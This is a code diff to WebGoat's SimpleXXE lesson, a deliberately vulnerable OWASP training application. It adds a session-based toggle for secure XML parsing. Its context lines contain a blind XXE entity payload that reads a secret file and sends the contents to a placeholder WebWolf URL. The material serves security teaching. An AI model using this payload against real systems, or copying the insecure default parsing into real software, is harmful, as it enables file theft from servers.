@@ -30,6 +30,7 @@ import org.owasp.webgoat.assignments.AttackResult;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.http.MediaType;
+import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -38,6 +39,10 @@ import org.springframework.web.bind.annotation.RestController;
 
 import static org.springframework.http.MediaType.ALL_VALUE;
 import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;
+
+import java.util.Random;
+
+import javax.servlet.http.HttpServletRequest;
 
 
 /**
@@ -63,10 +68,14 @@ public class SimpleXXE extends AssignmentEndpoint {
 
     @PostMapping(path = "xxe/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
     @ResponseBody
-    public AttackResult createNewComment(@RequestBody String commentStr) throws Exception {
+    public AttackResult createNewComment(HttpServletRequest request, @RequestBody String commentStr) throws Exception {
         String error = "";
         try {
-            Comment comment = comments.parseXml(commentStr);
+        	boolean secure = false;
+        	if (null != request.getSession().getAttribute("applySecurity")) {
+        		secure = true;
+        	}
+            Comment comment = comments.parseXml(commentStr, secure);
             comments.addComment(comment, false);
             if (checkSolution(comment)) {
                 return success(this).build();
@@ -99,6 +108,17 @@ public class SimpleXXE extends AssignmentEndpoint {
                 + "<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n"
                 + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n"
                 + "%all;";
+    }
+    
+    @GetMapping(path="/xxe/applysecurity",produces=MediaType.TEXT_PLAIN_VALUE)
+    @ResponseBody
+    public String setSecurity(HttpServletRequest request) {
+		
+		String applySecurity = (String) request.getSession().getAttribute("applySecurity");
+		if (applySecurity == null) {
+			request.getSession().setAttribute("applySecurity", "true");
+		}
+		return "xxe security will be applied";
     }
 
 }
